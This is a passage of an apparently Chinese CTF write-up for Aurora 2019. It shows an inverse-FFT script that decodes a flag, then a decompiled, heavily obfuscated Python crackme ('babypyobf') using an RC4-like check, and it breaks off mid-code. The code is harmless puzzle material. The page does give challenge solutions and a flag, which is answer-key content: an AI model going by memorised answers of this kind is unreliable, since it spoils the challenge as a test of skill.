class="number">194.920013j</span></span><br><span class="line">, <span class="number">193.618795</span>+-<span class="number">132.334524j</span></span><br><span class="line">, <span class="number">67.700291</span>+-<span class="number">0.289133j</span></span><br><span class="line">, -<span class="number">226.244482</span>+<span class="number">192.209548j</span></span><br><span class="line">, <span class="number">70.130387</span>+<span class="number">33.427264j</span></span><br><span class="line">, -<span class="number">44.884652</span>+-<span class="number">197.849559j</span></span><br><span class="line">, -<span class="number">19.733441</span>+<span class="number">99.565927j</span></span><br><span class="line">, <span class="number">250.565930</span>+-<span class="number">216.914862j</span></span><br><span class="line">, -<span class="number">39.000000</span>+-<span class="number">59.000000j</span></span><br><span class="line">, -<span class="number">394.398931</span>+<span class="number">209.943785j</span></span><br><span class="line">, <span class="number">80.006146</span>+-<span class="number">32.461173j</span></span><br><span class="line">, <span class="number">49.024463</span>+<span class="number">284.883248j</span></span><br><span class="line">, -<span class="number">70.320446</span>+-<span class="number">67.783066j</span></span><br><span class="line">, <span class="number">33.053734</span>+-<span class="number">259.878065j</span></span><br><span class="line">, -<span class="number">108.843257</span>+-<span class="number">66.579179j</span></span><br><span class="line">, <span class="number">90.381205</span>+<span class="number">85.665476j</span></span><br><span class="line">, -<span class="number">72.822164</span>+<span class="number">35.935487j</span></span><br><span class="line">, -<span class="number">1.939557</span>+-<span class="number">61.013322j</span></span><br><span class="line">, <span class="number">147.793563</span>+<span class="number">214.627442j</span></span><br><span class="line">, <span class="number">155.760202</span>+<span class="number">298.813681j</span></span><br><span class="line">, <span class="number">118.932918</span>+<span class="number">176.642861j</span></span><br><span class="line">, <span class="number">62.163761</span>+<span class="number">46.545100j</span>]</span><br><span class="line"></span><br><span class="line">a = np.fft.ifft(key)</span><br><span class="line"><span class="comment">#print a.real 取实部</span></span><br><span class="line"></span><br><span class="line">s = [<span class="number">65.</span>, <span class="number">117.0000001</span>, <span class="number">114.00000002</span>, <span class="number">111.00000002</span>, <span class="number">114.00000001</span>, <span class="number">97.00000009</span>, <span class="number">122.99999989</span>, <span class="number">100.00000012</span>, <span class="number">49.00000005</span>, <span class="number">52.99999998</span>, <span class="number">99.00000002</span>, <span class="number">113.99999994</span>, <span class="number">51.00000007</span>, <span class="number">55.00000007</span>, <span class="number">51.00000007</span>, <span class="number">95.00000007</span>, <span class="number">101.99999993</span>, <span class="number">48.00000004</span>, <span class="number">117.</span>, <span class="number">113.99999996</span>, <span class="number">48.99999996</span>, <span class="number">51.</span>, <span class="number">113.99999996</span>, <span class="number">94.99999997</span>, <span class="number">55.00000002</span>, <span class="number">113.99999996</span>, <span class="number">51.99999998</span>, <span class="number">109.99999992</span>, <span class="number">53.00000007</span>, <span class="number">101.99999992</span>, <span class="number">48.00000004</span>, <span class="number">114.00000002</span>, <span class="number">109.00000003</span>, <span class="number">94.99999991</span>, <span class="number">48.99999997</span>, <span class="number">53.00000002</span>, <span class="number">95.00000002</span>, <span class="number">113.99999998</span>, <span class="number">50.99999998</span>, <span class="number">52.</span>, <span class="number">107.99999996</span>, <span class="number">107.99999994</span>, <span class="number">121.</span>, <span class="number">95.00000011</span>, <span class="number">48.99999999</span>, <span class="number">110.00000008</span>, <span class="number">55.</span>, <span class="number">50.99999992</span>, <span class="number">114.00000001</span>, <span class="number">51.</span>, <span class="number">53.</span>, <span class="number">54.99999994</span>, <span class="number">48.99999988</span>, <span class="number">109.99999994</span>, <span class="number">54.00000006</span>, <span class="number">124.99999998</span>]</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">map</span>(<span class="built_in">round</span>, s))<span class="comment">#取整</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, s))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag:Aurora{d15cr373_f0ur13r_7r4n5f0rm_15_r34lly_1n73r3571n6}</p><h2 id="babypyobf"><a href="#babypyobf" class="headerlink" title="babypyobf"></a>babypyobf</h2><p>题目:<a href="https://raw.githubusercontent.com/Alikas0/CTF/master/challenges/2019/Aurora/babypyobf/babypyobf.cpython-37.pyc">babypyobf</a></p><p>打开来是个.pyc文件, 用uncompyle6转成py文件。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.3.3</span></span><br><span class="line"><span class="comment"># Python bytecode 3.7 (3394)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.6.8 (default, Jan 14 2019, 11:02:34)</span></span><br><span class="line"><span class="comment"># [GCC 8.0.1 20180414 (experimental) [trunk revision 259383]]</span></span><br><span class="line"><span class="comment"># Embedded file name: pyobf.py</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 11907 bytes</span></span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉 = []</span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𢉌 = <span class="built_in">list</span></span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤنجم = <span class="built_in">map</span></span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐠧 = <span class="built_in">ord</span></span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ犮 = <span class="built_in">print</span></span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐼖 = <span class="built_in">input</span></span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤࢳ = <span class="built_in">len</span></span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐮏 = <span class="literal">True</span></span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݐ = <span class="string">&#x27;the_flag_is_not_here&#x27;</span></span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐬝 = [<span class="number">199</span>, <span class="number">191</span>, <span class="number">168</span>, <span class="number">72</span>, <span class="number">189</span>, <span class="number">125</span>, <span class="number">226</span>, <span class="number">235</span>, <span class="number">210</span>, <span class="number">126</span>, <span class="number">156</span>, <span class="number">247</span>, <span class="number">93</span>, <span class="number">137</span>, <span class="number">42</span>, <span class="number">138</span>, <span class="number">76</span>, <span class="number">23</span>, <span class="number">139</span>, <span class="number">151</span>, <span class="number">29</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">136</span>, <span class="number">143</span>, <span class="number">129</span>, <span class="number">0</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">19</span>, <span class="number">236</span>, <span class="number">61</span>, <span class="number">235</span>, <span class="number">70</span>, <span class="number">18</span>, <span class="number">27</span>, <span class="number">250</span>, <span class="number">135</span>, <span class="number">60</span>, <span class="number">112</span>, <span class="number">48</span>]</span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݐ = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𢉌(𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤنجم(𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐠧, 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𢉌(𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݐ)))</span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ犮(<span class="string">&#x27;Input:&#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤق = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐼖()</span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤق = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𢉌(𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤنجم(𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐠧, 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𢉌(𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤق)))</span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ绤 = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤࢳ(𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤق)</span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = -<span class="number">1479559293</span></span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𥞝 = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤࢳ(𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݐ)</span><br><span class="line">𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸 = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐮏:</span><br><span class="line">    <span class="keyword">while</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐮏:</span><br><span class="line">        <span class="keyword">while</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐮏:</span><br><span class="line">            <span class="keyword">while</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐮏:</span><br><span class="line">                <span class="keyword">while</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐮏:</span><br><span class="line">                    <span class="keyword">while</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐮏:</span><br><span class="line">                        <span class="keyword">while</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐮏:</span><br><span class="line">                            <span class="keyword">while</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐮏:</span><br><span class="line">                                <span class="keyword">while</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 == -<span class="number">2118257528</span>:</span><br><span class="line">                                    𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ햣 = <span class="number">1939365939</span></span><br><span class="line">                                    <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤسم &lt; 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ绤:</span><br><span class="line">                                        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ햣 = <span class="number">1644783123</span></span><br><span class="line">                                    𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ햣</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 != -<span class="number">1889341384</span>:</span><br><span class="line">                                    <span class="keyword">break</span></span><br><span class="line">                                𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸</span><br><span class="line">                                𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = -<span class="number">798623831</span></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 != -<span class="number">1717721974</span>:</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                            𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸 = <span class="number">0</span></span><br><span class="line">                            𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ = <span class="number">0</span></span><br><span class="line">                            𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤسم = <span class="number">0</span></span><br><span class="line">                            𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = -<span class="number">2118257528</span></span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 != -<span class="number">1479559293</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦘢 = <span class="number">1698955189</span></span><br><span class="line">                        <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸 &lt; <span class="number">256</span>:</span><br><span class="line">                            𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦘢 = <span class="number">1974196793</span></span><br><span class="line">                        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦘢</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 != -<span class="number">1443714681</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ = <span class="number">0</span></span><br><span class="line">                    𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸 = <span class="number">0</span></span><br><span class="line">                    𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = <span class="number">2110390670</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 != -<span class="number">1288645142</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𘔌 = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݐ[(𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸 % 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𥞝)] + 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] + 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ</span><br><span class="line">                𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𘔌 &amp; (𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𘔌 ^ <span class="number">3840</span>)</span><br><span class="line">                𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] = (𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] &amp; <span class="number">235</span> | ~𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] &amp; <span class="number">20</span>) ^ (𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] &amp; <span class="number">235</span> | ~𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] &amp; <span class="number">20</span>)</span><br><span class="line">                𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] = ~𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] &amp; 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] | ~𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] &amp; 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸]</span><br><span class="line">                𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] = (𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] &amp; <span class="number">212</span> | ~𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] &amp; <span class="number">43</span>) ^ (𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] &amp; <span class="number">212</span> | ~𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] &amp; <span class="number">43</span>)</span><br><span class="line">                𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = -<span class="number">367188513</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 != -<span class="number">798623831</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸 += <span class="number">1</span></span><br><span class="line">            𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = <span class="number">1405424855</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 != -<span class="number">606860395</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤسم += <span class="number">1</span></span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = -<span class="number">2118257528</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 == -<span class="number">605967056</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 == -<span class="number">586318370</span>:</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = -<span class="number">605967056</span></span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ犮(<span class="string">&#x27;Bad&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 == -<span class="number">367188513</span>:</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸 += <span class="number">1</span></span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = <span class="number">2110390670</span></span><br><span class="line">    <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 == <span class="number">833744747</span>:</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸 += <span class="number">1</span></span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = -<span class="number">1479559293</span></span><br><span class="line">    <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 == <span class="number">1405424855</span>:</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𬸟 = -<span class="number">1443714681</span></span><br><span class="line">        <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸 &lt; <span class="number">256</span>:</span><br><span class="line">            𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𬸟 = -<span class="number">1889341384</span></span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𬸟</span><br><span class="line">    <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 == <span class="number">1513289402</span>:</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = -<span class="number">605967056</span></span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ犮(<span class="string">&#x27;Good!&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 == <span class="number">1644783123</span>:</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸 = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸 + <span class="number">1</span> &amp; <span class="number">255</span></span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] + 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ &amp; <span class="number">255</span></span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] = ~𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] &amp; 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] | 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] &amp; ~𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸]</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] = (𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] &amp; <span class="number">212</span> | ~𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] &amp; <span class="number">43</span>) ^ (𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] &amp; <span class="number">212</span> | ~𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] &amp; <span class="number">43</span>)</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] = ~𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] &amp; 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] | 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] &amp; ~𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸]</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤق[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤسم] ^= 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[(𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤݜ] + 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉[𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸] &amp; <span class="number">255</span>)]</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = -<span class="number">606860395</span></span><br><span class="line">    <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 == <span class="number">1698955189</span>:</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸 = <span class="number">0</span></span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = <span class="number">1405424855</span></span><br><span class="line">    <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 == <span class="number">1939365939</span>:</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤٿ = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤق == 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𐬝</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𮏷 = <span class="number">1513289402</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤٿ:</span><br><span class="line">            𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𮏷 = -<span class="number">586318370</span></span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𮏷</span><br><span class="line">    <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 == <span class="number">1974196793</span>:</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𡣉.append(<span class="number">0</span>)</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 = <span class="number">833744747</span></span><br><span class="line">    <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ𦗴 == <span class="number">2110390670</span>:</span><br><span class="line">        𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤبخ = -<span class="number">1717721974</span></span><br><span class="line">        <span class="keyword">if</span> 𤐕يم絎𩸨ۅ𧁆תּط푊𬵝نحممحج荜ࡤ뉸 &lt; <span class="number">256</span>:</span><br><span class="line">            